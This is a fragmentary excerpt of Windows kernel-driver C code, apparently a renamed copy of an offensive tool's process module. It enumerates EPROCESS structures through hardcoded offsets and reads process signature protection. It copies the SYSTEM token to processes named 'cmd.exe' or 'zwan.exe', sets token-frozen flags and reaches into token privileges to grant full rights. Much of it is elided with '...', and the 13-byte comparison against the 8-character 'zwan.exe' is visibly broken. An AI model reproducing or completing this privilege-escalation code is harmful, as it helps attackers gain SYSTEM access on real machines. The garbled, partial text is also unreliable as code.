...
const ULONG EPROCESS_OffSetTable[MangoOsIndex_MAX][Eprocess_MAX] =
...
NTSTATUS kkll_m_process_enum(SIZE_T szBufferIn, PVOID bufferIn, PMANGO_BUFFER outBuffer, PKKLL_M_PROCESS_CALLBACK callback, PVOID pvArg)
{
	...
	for(
		...
		NT_SUCCESS(status) && (PEPROCESS) ((ULONG_PTR) (*(PVOID *) (((ULONG_PTR) pProcess) + EPROCESS_OffSetTable[MangoOsIndex][EprocessNext])) - EPROCESS_OffSetTable[MangoOsIndex][EprocessNext]) != PsInitialSystemProcess;
		pProcess = (PEPROCESS) ((ULONG_PTR) (*(PVOID *) (((ULONG_PTR) pProcess) + EPROCESS_OffSetTable[MangoOsIndex][EprocessNext])) - EPROCESS_OffSetTable[MangoOsIndex][EprocessNext])
		)
	{
...
{
	NTSTATUS status;
	PMANGO_PROCESS_SIGNATURE_PROTECTION pSignatureProtect = NULL;
	PULONG pFlags2 = NULL;
	...
	if(NT_SUCCESS(status))
	{
		...
		{
			pFlags2 = (PULONG) (((ULONG_PTR) pProcess) + EPROCESS_OffSetTable[MangoOsIndex][EprocessFlags2]);
			status = kprintf(outBuffer, L"\t%s", (*pFlags2 & TOKEN_FROZEN_MASK) ? L"F-Tok" : L"     ");
			if(NT_SUCCESS(status))
			{
				if(MangoOsIndex >= MangoOsIndex_8)
				{
					pSignatureProtect = (PMANGO_PROCESS_SIGNATURE_PROTECTION) (((ULONG_PTR) pProcess) + EPROCESS_OffSetTable[MangoOsIndex][SignatureProtect]);
					status = kprintf(outBuffer, L"\tSig %02x/%02x", pSignatureProtect->SignatureLevel, pSignatureProtect->SectionSignatureLevel);
					if(NT_SUCCESS(status) && (MangoOsIndex > MangoOsIndex_8))
...
NTSTATUS kkll_m_process_systoken_callback(SIZE_T szBufferIn, PVOID bufferIn, PMANGO_BUFFER outBuffer, PEPROCESS pProcess, PVOID pvArg)
{
	...
	if((RtlCompareMemory("zwan.exe", processName, 13) == 13) || (RtlCompareMemory("cmd.exe", processName, 7) == 7))
...
NTSTATUS kkll_m_process_token_toProcess(SIZE_T szBufferIn, PVOID bufferIn, PMANGO_BUFFER outBuffer, HANDLE hSrcToken, PEPROCESS pToProcess)
{
	...
	if(NT_SUCCESS(status))
	{
		...
		if(NT_SUCCESS(status))
		{
			if(MangoOsIndex >= MangoOsIndex_VISTA)
			{
				pFlags2 = (PULONG) (((ULONG_PTR) pToProcess) + EPROCESS_OffSetTable[MangoOsIndex][EprocessFlags2]);
			...
			if((MangoOsIndex >= MangoOsIndex_VISTA) && pFlags2)
				*pFlags2 |= TOKEN_FROZEN_MASK;
...
NTSTATUS kkll_m_process_fullprivileges(SIZE_T szBufferIn, PVOID bufferIn, PMANGO_BUFFER outBuffer)
{
	...
	PMANGO_NT6_PRIVILEGES pPrivileges;
	...
	if(MangoOsIndex >= MangoOsIndex_VISTA)
	{
		...
		if(NT_SUCCESS(status) && pProcess)
		{
			if(pAccessToken = PsReferencePrimaryToken(pProcess))
			{
				...
				pPrivileges = (PMANGO_NT6_PRIVILEGES) (((ULONG_PTR) pAccessToken) + EPROCESS_OffSetTable[MangoOsIndex][TokenPrivs]);
